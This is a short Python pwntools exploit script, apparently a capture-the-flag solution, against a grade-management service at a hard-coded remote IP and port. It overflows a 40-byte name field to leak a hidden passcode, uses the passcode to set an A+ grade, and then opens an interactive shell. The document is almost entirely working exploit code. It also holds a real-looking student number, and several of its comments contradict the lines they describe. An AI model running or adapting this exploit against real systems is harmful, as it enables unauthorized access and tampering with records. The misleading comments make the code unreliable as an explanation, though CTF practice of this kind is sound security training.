from pwn import *

# Set up the remote connection
r = remote('221.149.226.120', 31338)

# Receive the initial message
r.recvuntil(b"[Professor's grade management program]\n\n")

# Step 1: Send option 1 to input student information with maximum values
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'1')
r.recvuntil(b"enter below informations.\n\n")
r.recvuntil(b"[student number]\n")
r.sendline(b'1')  # Enter a valid student number
r.recvuntil(b"[name]\n")
r.send(b'A' * 40)  # Fill the name field with maximum characters
r.recvuntil(b"[grade]\n")
r.send(b'B'*4)  # Enter a valid grade (not A+)

# Step 2: Send option 2 to print student information
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'2')
leak = r.recvuntil(b'\n')[:-1]
leak = leak.split(b':')[1].strip()
passcode = leak[40:44]
print("leaked pass code:", passcode)
r.recvuntil(b"\n")

r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'1')
r.recvuntil(b"enter below informations.\n\n")
r.recvuntil(b"[student number]\n")
r.sendline(b'2020170365')  # Enter a valid student number
r.recvuntil(b"[name]\n")
r.send(b'gayeong')  # Fill the name field with maximum characters
r.recvuntil(b"[grade]\n")
r.send(b'A+')  # Enter a valid grade (not A+)
r.recvuntil(b"To award an A+ grade, please enter the passcode:\n")
r.sendline(passcode)  # Send the leaked passcode

r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'3')
r.recvuntil(b"\n")
r.recvuntil(b"\n")
r.send(b'gayeong') 
r.recvuntil(b"\n")
r.recvuntil(b"\n")
leak = r.recvuntil(b'\n')[:-1]
print(leak)

# Interact with the spawned shell
r.interactive()

